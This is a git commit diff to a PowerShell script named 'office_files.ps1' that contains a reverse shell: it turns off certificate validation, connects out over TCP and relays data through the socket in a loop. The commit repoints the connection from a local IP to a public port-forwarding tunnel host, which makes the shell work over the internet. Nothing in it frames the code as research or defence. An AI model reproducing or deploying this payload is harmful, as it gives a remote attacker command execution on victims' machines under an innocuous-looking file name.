2db46f2b2a003887894f379f0205753c8bdeef15
suidbin00000 <adityax7@outlook.com>
2025-10-31 16:40:18 +0000

    Update office_files.ps1

--- office_files.ps1
+++ office_files.ps1
@@ -1,5 +1,5 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-$c = New-Object System.Net.Sockets.TCPClient('192.168.0.18', '5555');
+$c = New-Object System.Net.Sockets.TCPClient('johnybigD-59557.portmap.host', '59557');
 $s = $c.GetStream();
 [byte[]]$b = 0..65535|%{0};
 while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
@@ -10,4 +10,5 @@ $s.Write($f, 0, $f.Length);
 $s.Flush();
 }
 $c.Close();
+
 
